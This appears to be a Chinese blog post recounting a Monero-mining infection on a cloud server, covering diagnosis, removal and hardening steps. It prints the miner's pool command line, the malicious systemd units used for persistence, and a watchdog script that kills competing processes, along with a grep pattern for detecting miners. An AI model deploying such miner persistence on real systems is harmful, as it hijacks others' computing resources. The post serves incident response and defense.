# 记一次服务器挖矿病毒入侵与恢复全过程

## 背景

某天下午，网站突然无法访问，SSH 连接超时，阿里云控制台显示实例 CPU 100%、内存溢出（OOM）。经过诊断，发现服务器被植入了 XMR 门罗币挖矿程序。

本文记录从发现异常到完全恢复的全过程，以及后续的安全加固措施。

---

## 一、发现异常

### 症状

- 网站返回 502 Bad Gateway 或直接超时
- SSH 连接在 banner exchange 阶段超时
- 阿里云控制台实例自助诊断报告：
  - **严重**：实例存在安全风险
  - **严重**：实例云盘读写受限
  - **警告**：操作系统曾出现系统异常或崩溃
  - **警告**：实例历史负载高

### 关键日志

```
Out of memory: Killed process 420762 (syystemd) total-vm:2437672kB, anon-rss:804072kB
```

系统 OOM Killer 杀死了伪装成 `systemd` 的挖矿进程。

---

## 二、诊断过程

### 2.1 确认挖矿程序

通过阿里云安全中心发现两条严重事件：

```
主机上检测到挖矿程序
文件路径：/usr/local/bin/systemd
恶意文件家族：Miner:Linux/CoinMiner
进程命令行：systemd -o xmr.kryptex.network:8029 -u <钱包地址> --tls -t 2 --cpu-max-threads-hint=100
```

挖矿程序伪装成系统进程 `systemd`，实际连接矿池 `xmr.kryptex.network` 进行门罗币挖矿。

### 2.2 查找持久化机制

通过 VNC 控制台登录后，发现了两个恶意 systemd 服务：

**`systemd.service`** — 挖矿主程序：
```ini
[Unit]
Description=System Proxy Service
After=network.target

[Service]
ExecStart=systemd -o xmr.kryptex.network:8029 -u <钱包地址> --tls -t 2 --cpu-max-threads-hint=100
Restart=always
RestartSec=60
```

**`observed.service`** — 看门狗脚本：
```ini
[Unit]
Description=System Observer Service
After=network.target

[Service]
ExecStart=/bin/sh free_proc.sh
Restart=always
RestartSec=30
```

`free_proc.sh` 的内容是一个恶意脚本，会杀死 CPU 占用超过 200% 的非挖矿进程，确保挖矿程序独占资源：

```bash
#!/bin/bash
while true; do
    ps -eo pid,pcpu,args | awk '$2 > 200 && !/systemd/ {print $1}' | xargs -r kill -9
    sleep 2
done
```

---

## 三、恢复过程

### 3.1 第一步：强制重启

由于 SSH 完全无法连接，通过阿里云控制台执行**强制重启**实例。这一步让系统从 OOM 状态中恢复，SSH 服务重新启动。

### 3.2 第二步：杀掉挖矿进程

通过 VNC 控制台登录后，执行：

```bash
# 杀掉挖矿进程
kill -9 $(pgrep -f "xmr.kryptex.network")
pkill -f "systemd -o xmr"

# 删除恶意文件
rm -f /usr/local/bin/systemd
rm -f /usr/local/bin/free_proc.sh
```

### 3.3 第三步：清除恶意服务

```bash
# 停止并禁用恶意服务
systemctl stop systemd.service
systemctl disable systemd.service
systemctl stop observed.service
systemctl disable observed.service

# 删除服务文件
rm -f /etc/systemd/system/systemd.service
rm -f /etc/systemd/system/observed.service
systemctl daemon-reload
```

### 3.4 第四步：重启业务服务

```bash
# 重启 SSH 和 nginx
systemctl restart sshd
systemctl restart nginx

# 重启应用
cd /www/wwwroot/<应用目录>
pm2 delete all
pm2 start ecosystem.config.js
```

---

## 四、安全加固

恢复服务后，立即进行了全面的安全加固。

### 4.1 系统更新

```bash
apt update && apt upgrade -y
```

安装了 43 个安全补丁。

### 4.2 SSH 加固

生成新的 SSH 密钥对，禁用密码登录：

```bash
# 生成密钥
ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519_hardened -C 'hardened-key'

# 配置 SSH
cat > /etc/ssh/sshd_config.d/hardened.conf << 'EOF'
PermitRootLogin prohibit-password
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3
LoginGraceTime 30
ClientAliveInterval 300
ClientAliveCountMax 2
X11Forwarding no
AllowTcpForwarding no
EOF

systemctl restart sshd
```

### 4.3 安装 fail2ban

防止暴力破解：

```bash
apt install -y fail2ban

cat > /etc/fail2ban/jail.local << 'EOF'
[DEFAULT]
bantime = 3600
findtime = 600
maxretry = 3

[sshd]
enabled = true
maxretry = 3
bantime = 3600
EOF

systemctl enable fail2ban
systemctl start fail2ban
```

### 4.4 配置防火墙

使用 ufw 限制入站端口：

```bash
ufw default deny incoming
ufw default allow outgoing
ufw allow ssh
ufw allow 80/tcp
ufw allow 443/tcp
ufw enable
```

最终只开放 22（SSH）、80（HTTP）、443（HTTPS）三个端口。

### 4.5 内核参数加固

```bash
cat >> /etc/sysctl.conf << 'EOF'
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 0
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.all.log_martians = 1
net.ipv4.icmp_echo_ignore_broadcasts = 1
net.ipv4.tcp_syncookies = 1
EOF

sysctl -p
```

### 4.6 PM2 内存限制

降低 Node.js 应用内存限制，防止再次 OOM：

```javascript
// ecosystem.config.js
module.exports = {
  apps: [{
    name: 'app',
    max_memory_restart: '300M',
    node_args: '--max-old-space-size=256',
  }]
}
```

---

## 五、入侵原因分析

挖矿程序的入侵路径可能是：

1. **弱密码或默认密码**：SSH 或其他服务使用了弱密码
2. **未修补的系统漏洞**：系统长时间未更新安全补丁
3. **暴露的管理端口**：宝塔面板、数据库等管理端口对外开放

恶意程序的持久化方式：

| 手段 | 说明 |
|------|------|
| 伪装文件名 | `/usr/local/bin/systemd` 伪装成系统进程 |
| systemd 服务 | 创建自启动服务，重启后自动恢复 |
| 看门狗脚本 | 监控挖矿进程，被杀后自动重启 |

---

## 六、经验教训

### 6.1 及时更新系统

```bash
# 配置自动安全更新
cat > /etc/apt/apt.conf.d/20auto-upgrades << 'EOF'
APT::Periodic::Update-Package-Lists "1";
APT::Periodic::Unattended-Upgrade "1";
EOF
```

### 6.2 最小权限原则

- SSH 禁用密码登录，仅允许密钥认证
- 防火墙只开放必要端口
- 管理面板不对外暴露

### 6.3 监控告警

- 配置阿里云安全告警
- 定期检查 CPU 和内存使用情况
- 关注异常进程和服务

### 6.4 定期审计

```bash
# 检查可疑进程
ps aux | grep -E 'kdevtmpfs|kinsing|xmr|miner'

# 检查可疑服务
systemctl list-units --type=service --state=running

# 检查定时任务
crontab -l
ls -la /etc/cron.d/

# 检查 SSH 密钥
cat ~/.ssh/authorized_keys
```

---

## 七、恢复时间线

| 时间 | 事件 |
|------|------|
| T+0 | 发现网站无法访问，SSH 超时 |
| T+5min | 阿里云诊断报告 OOM 和挖矿程序 |
| T+10min | 强制重启实例 |
| T+15min | 通过 VNC 登录，杀掉挖矿进程 |
| T+20min | 清除恶意服务和文件 |
| T+25min | 重启业务服务，网站恢复 |
| T+30min | 开始安全加固 |
| T+60min | 安全加固完成 |

---

## 八、总结

这次入侵的根本原因是服务器安全防护不足。挖矿程序通过漏洞或弱密码入侵后，利用 systemd 服务和看门狗脚本实现持久化，消耗了服务器全部 CPU 和内存资源，导致所有服务不可用。

关键教训：

1. **安全不是可选项**：服务器上线前必须完成基础安全加固
2. **监控很重要**：阿里云安全中心的告警要及时处理
3. **备份是底线**：定期备份可以在最坏情况下快速恢复
4. **SSH 密钥 > 密码**：密钥认证比密码安全得多

如果你的服务器也出现了类似的 CPU 飙高、OOM、服务不可用等症状，建议立即检查是否有挖矿程序入侵。

---

*写于 2026 年 5 月 30 日*
